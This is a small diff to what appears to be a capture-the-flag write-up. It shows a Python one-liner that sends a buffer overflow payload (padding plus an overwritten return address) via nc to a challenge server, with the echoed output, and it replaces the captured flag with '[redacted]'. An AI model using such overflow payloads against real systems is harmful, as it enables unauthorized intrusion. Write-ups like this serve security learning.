@@ -96,7 +96,7 @@ And finally we've got the flag:
 ```
 $ python -c 'import struct; q=lambda x: struct.pack("<I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
 ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
-96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d5bc1a129a
+[redacted]
 ```
 
 And another 100 pt.
